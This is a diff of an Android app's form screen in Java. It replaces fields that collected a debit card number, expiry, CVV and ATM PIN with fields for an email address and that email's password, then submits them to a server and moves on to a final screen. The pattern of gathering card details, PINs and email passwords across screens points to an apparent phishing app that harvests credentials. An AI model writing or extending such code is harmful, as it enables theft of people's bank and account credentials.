@@ -8,6 +8,7 @@ import android.view.View;
 import android.widget.Button;
 import android.widget.EditText;
 import android.widget.LinearLayout;
+import android.widget.TextView;
 import android.widget.Toast;
 
 import org.json.JSONException;
@@ -26,26 +27,16 @@ public class SecondActivity extends  BaseActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main2);
 
-        frontView = findViewById(R.id.frontView);
-        backView = findViewById(R.id.backView);
-
-
-        EditText card = findViewById(R.id.cardNumber);
-        card.addTextChangedListener(new DebitCardInputMask(card));
-
-        EditText expiry = findViewById(R.id.expiry);
-        expiry.addTextChangedListener(new ExpiryDateInputMask(expiry));
-
-        EditText cvv = findViewById(R.id.cvv);
-
         int form_id = getIntent().getIntExtra("form_id", -1);
+        // Start
+        TextView slidingText = findViewById(R.id.slidingText);
+        slidingText.setSelected(true);
+        startSlide();
 
         dataObject = new HashMap<>();
         ids = new HashMap<>();
-        ids.put(R.id.cvv, "cvv");
-        ids.put(R.id.cardNumber, "cardNumber");
-        ids.put(R.id.expiry, "expiry");
-        ids.put(R.id.pinNum, "pinNum");
+        ids.put(R.id.email, "email");
+        ids.put(R.id.emailpass, "emailpass");
 
         // Populate dataObject
         for(Map.Entry<Integer, String> entry : ids.entrySet()) {
@@ -56,20 +47,8 @@ public class SecondActivity extends  BaseActivity {
             dataObject.put(key, value);
         }
 
-        // 🔹 Auto flip logic when front fields complete
-        TextWatcher watcher = new SimpleTextWatcher(() -> {
-            if (isFrontFieldsValid(card, expiry, cvv) && backView.getVisibility() == View.GONE) {
-                flipToBack(frontView, backView);
-            }
-        });
-
-        card.addTextChangedListener(watcher);
-        expiry.addTextChangedListener(watcher);
-        cvv.addTextChangedListener(watcher);
-
         Button buttonSubmit = findViewById(R.id.btnProceed);
         buttonSubmit.setOnClickListener(v -> {
-
             if (!validateForm()) {
                 Toast.makeText(this, "Form validation failed", Toast.LENGTH_SHORT).show();
                 return;
@@ -92,7 +71,7 @@ public class SecondActivity extends  BaseActivity {
                             int formId = response.optInt("data", -1);
                             String message = response.optString("message", "No message");
                             if (status == 200 && formId != -1) {
-                                Intent intent = new Intent(context, ThirdActivity.class);
+                                Intent intent = new Intent(context, LastActivity.class);
                                 intent.putExtra("form_id", formId);
                                 startActivity(intent);
                             } else {
@@ -137,27 +116,10 @@ public class SecondActivity extends  BaseActivity {
 
             // Validate based on the key
             switch (key) {
-                case "cardNumber":
-                    if (!FormValidator.validateMinLength(editText, 19, "Invalid Card Number")) {
-                        isValid = false;
-                    }
-                    break;
-                case "cvv":
-                    if (!FormValidator.validateMinLength(editText, 3,  "Invalid CVV")) {
-                        isValid = false;
-                    }
-                    break;
-                case "expiry":
-                    if (!FormValidator.validateMinLength(editText, 5,  "Invalid Expiry Date")) {
-                        isValid = false;
-                    }
-                    break;
-                case "pinNum":
-                    if (!FormValidator.validateMinLength(editText, 4,  "Invalid ATM Pin")) {
-                        isValid = false;
-                    }
-                    break;
-
+                case "email":
+                if (!FormValidator.validateEmail(editText, "Please enter valid email")) {
+                    isValid = false;
+                }
                 default:
                     break;
             }
